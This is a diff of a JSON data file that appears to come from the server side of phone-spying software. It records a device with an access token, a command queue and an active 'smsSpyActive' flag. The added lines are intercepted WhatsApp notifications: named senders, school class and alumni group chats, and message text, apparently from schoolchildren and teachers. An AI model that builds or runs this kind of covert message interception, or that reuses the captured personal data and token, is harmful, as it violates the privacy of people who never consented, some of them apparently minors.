@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776857190236,
+    "lastSeen": 1776857197665,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -9969,6 +9969,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Grup ALUMNI SD MUHAMMADIYAH: ~ ningsih",
+        "content": "💟 Stiker",
+        "time": "22/04 19:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776857190401
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎191 pesan dari 4 chat",
+        "time": "22/04 19:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776857190391
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎PJOK 8.10 (4 pesan): ~ Jasniah Daud🥰😘",
+        "content": "Nilai tuntas ulangan harian senam irama\n1. No. Urut 01\n2. No. Urut 14",
+        "time": "22/04 19:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776857190338
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Class 8.10 ‼️ (79 pesan): ~ VianBakri",
